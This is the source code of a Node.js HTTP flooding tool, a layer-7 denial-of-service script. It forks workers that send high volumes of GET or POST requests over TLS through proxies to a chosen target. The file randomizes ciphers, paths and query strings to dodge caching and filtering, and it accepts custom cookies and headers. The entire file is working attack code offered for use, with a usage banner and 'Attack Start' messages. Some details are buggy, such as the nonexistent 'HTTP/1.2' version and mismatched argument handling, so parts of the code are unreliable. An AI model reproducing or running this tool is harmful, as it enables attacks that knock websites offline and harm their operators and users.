process.on('uncaughtException', function(er) {
    //console.error(er)
});
process.on('unhandledRejection', function(er) {
    //console.error(er)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');

var path = require("path");
const cluster = require('cluster');

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}

let headerbuilders;

let COOKIES = undefined;
let POSTDATA = undefined;

var fileName = __filename;
var file = path.basename(fileName);
let randomparam = false;

if (process.argv.length < 8){
    console.log('HTTP/1.2 (Support HTTPS Only)');
    console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")');
    process.exit(0);
}

process.argv.forEach((ss) => {
    if (ss.includes("cookie=")){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=")){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) Custom RandomString");
    } else if (ss.includes("headerdata=")){
        headerbuilders = "";
        const hddata = ss.slice(11).split('""')[0].split("&");
        for (let i = 0; i < hddata.length; i++) {
            const head = hddata[i].split("=")[0];
            const dat = hddata[i].split("=")[1];
            headerbuilders += `\r\n${head}: ${dat}`
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = ""
}
if (headerbuilders !== undefined){
    console.log("(!) Custom HeaderData Mode");
}
if (POSTDATA !== undefined){
    console.log("(!) Custom PostData Mode");
} else {
    POSTDATA = ""
}

if (cluster.isMaster){
    for (let i = 0; i < process.argv[7]; i++){
        cluster.fork();
        console.log(`Process ${i} To Start Attack`);
    }
    console.log("Attack Start")

    setTimeout(() => {
        process.exit(1);
    }, process.argv[5] * 1000);
} else {
    startflood();
}

var proxies = process.argv[4];
var rate = process.argv[6];
var UAs = process.argv[7];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

function startflood(){
    if (process.argv[2].toUpperCase() == "POST"){
        if (randomparam){
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies;
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.get({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.get({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%",ra()) + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                
                        tlsConnection.on('data', function (data) {
                            return;
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[2].toUpperCase() == "GET"){
        if (randomparam) {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.get({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
            
                var req = http.get({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                        //open raw request
                        var tlsConnection = tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLSv1_2_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            socket: socket
                        }, function () {
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
                
                        tlsConnection.on('error', function(data) {
                            tlsConnection.end();
                            tlsConnection.destroy();
                        });
                        tlsConnection.on('data', function(data) {
                        });
                    });
                    req.end();
                });
        }
    }
}